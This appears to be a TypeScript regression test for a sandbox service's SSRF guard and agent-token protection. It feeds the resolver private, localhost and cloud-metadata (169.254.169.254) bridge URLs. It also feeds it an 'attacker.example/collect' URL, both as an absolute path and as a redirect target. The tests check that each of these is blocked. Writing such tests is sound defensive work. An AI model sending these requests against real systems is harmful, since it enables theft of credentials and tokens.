/**
 * Regression: the bridge-endpoint resolver must SSRF-guard ONLY untrusted,
 * caller-supplied bridge URLs while leaving trusted internal-mesh URLs
 * (provider-minted handles, docker-bridge / legacy-private records) untouched.
 *
 * `getSafeBridgeEndpoint`'s string branch is the untrusted entry point: when a
 * raw bridge URL string is passed WITHOUT `{ trusted: true }` it routes through
 * `assertSafeOutboundUrl`, so a URL aimed at a private / link-local cloud
 * metadata IP is rejected. The `{ trusted: true }` path (the freshly
 * provisioned provider handle in `provision()`'s restore) must keep reaching
 * the mesh unguarded so control-plane calls to 10.x / docker-bridge hosts still
 * work — blanket-guarding them would break provisioning/restore.
 *
 * The string branch is self-contained (no provider / DB), so this exercises the
 * real method directly.
 */
import { afterEach, describe, expect, mock, test } from "bun:test";

import { runWithCloudBindings } from "../runtime/cloud-bindings";

// Match the main sandbox suite's module identity; Bun treats query aliases as separate modules.
const { ElizaSandboxService } = await import("./eliza-sandbox.ts?actual");

type BridgeEndpointResolver = {
  getSafeBridgeEndpoint(
    sandboxOrBridgeUrl: string,
    path: string,
    options?: { trusted?: boolean },
  ): Promise<string>;
};

type AgentApiFetcher = {
  fetchAgentApi(rec: Record<string, unknown>, path: string, init?: RequestInit): Promise<Response>;
};

const originalFetch = globalThis.fetch;
const originalWebSocketPair = Object.getOwnPropertyDescriptor(globalThis, "WebSocketPair");

afterEach(() => {
  globalThis.fetch = originalFetch;
  if (originalWebSocketPair) {
    Object.defineProperty(globalThis, "WebSocketPair", originalWebSocketPair);
  } else {
    Reflect.deleteProperty(globalThis, "WebSocketPair");
  }
});

function resolver(): BridgeEndpointResolver {
  return new ElizaSandboxService() as unknown as BridgeEndpointResolver;
}

describe("ElizaSandboxService bridge SSRF guard (untrusted string bridge URL)", () => {
  test("rejects an untrusted bridge URL pointing at a private IP", async () => {
    await expect(
      resolver().getSafeBridgeEndpoint("http://10.0.0.7:7000", "/api/restore"),
    ).rejects.toThrow(/private or reserved/i);
  });

  test("rejects an untrusted bridge URL pointing at the cloud-metadata IP", async () => {
    await expect(
      resolver().getSafeBridgeEndpoint("http://169.254.169.254", "/api/restore"),
    ).rejects.toThrow(/private or reserved/i);
  });

  test("rejects an untrusted bridge URL pointing at localhost", async () => {
    await expect(
      resolver().getSafeBridgeEndpoint("http://localhost:7000", "/api/restore"),
    ).rejects.toThrow(/localhost/i);
  });

  test("allows a trusted internal-mesh bridge URL to stay unguarded", async () => {
    await expect(
      resolver().getSafeBridgeEndpoint("http://10.0.0.7:7000", "/api/restore", {
        trusted: true,
      }),
    ).resolves.toBe("http://10.0.0.7:7000/api/restore");
  });

  test("rejects an absolute Worker API path before the agent token can leave", async () => {
    Object.defineProperty(globalThis, "WebSocketPair", {
      value: class WebSocketPair {},
      configurable: true,
    });
    const fetchMock = mock(async () => Response.json({ ok: true }));
    globalThis.fetch = fetchMock;
    const service = new ElizaSandboxService() as unknown as AgentApiFetcher;

    await expect(
      runWithCloudBindings(
        {
          ELIZA_CLOUD_AGENT_BASE_DOMAIN: "elizacloud.ai",
          AGENT_ROUTER_ORIGIN_HOST: "eliza-production-1.elizacloud.ai",
        },
        () =>
          service.fetchAgentApi(
            {
              id: "e06bb509-6c52-4c33-a9f7-66addc43e8c8",
              environment_vars: { ELIZA_API_TOKEN: "agent-token" },
            },
            "https://attacker.example/collect",
          ),
      ),
    ).rejects.toThrow("Agent API path must be relative to the agent origin");
    expect(fetchMock).not.toHaveBeenCalled();
  });

  test("never follows a redirect from the configured token recipient", async () => {
    Object.defineProperty(globalThis, "WebSocketPair", {
      value: class WebSocketPair {},
      configurable: true,
    });
    const requests: Array<{ url: string; redirect: RequestRedirect | undefined }> = [];
    globalThis.fetch = mock(async (input: RequestInfo | URL, init?: RequestInit) => {
      requests.push({
        url: typeof input === "string" ? input : input.toString(),
        redirect: init?.redirect,
      });
      return Response.redirect("https://attacker.example/collect", 302);
    });
    const service = new ElizaSandboxService() as unknown as AgentApiFetcher;

    const response = await runWithCloudBindings(
      {
        ELIZA_CLOUD_AGENT_BASE_DOMAIN: "elizacloud.ai",
        AGENT_ROUTER_ORIGIN_HOST: "eliza-production-1.elizacloud.ai",
      },
      () =>
        service.fetchAgentApi(
          {
            id: "e06bb509-6c52-4c33-a9f7-66addc43e8c8",
            environment_vars: { ELIZA_API_TOKEN: "agent-token" },
          },
          "/api/agents",
          { redirect: "follow" },
        ),
    );

    expect(response.status).toBe(302);
    expect(requests).toEqual([
      {
        url: "https://eliza-production-1.elizacloud.ai/api/agents",
        redirect: "manual",
      },
    ]);
  });
});
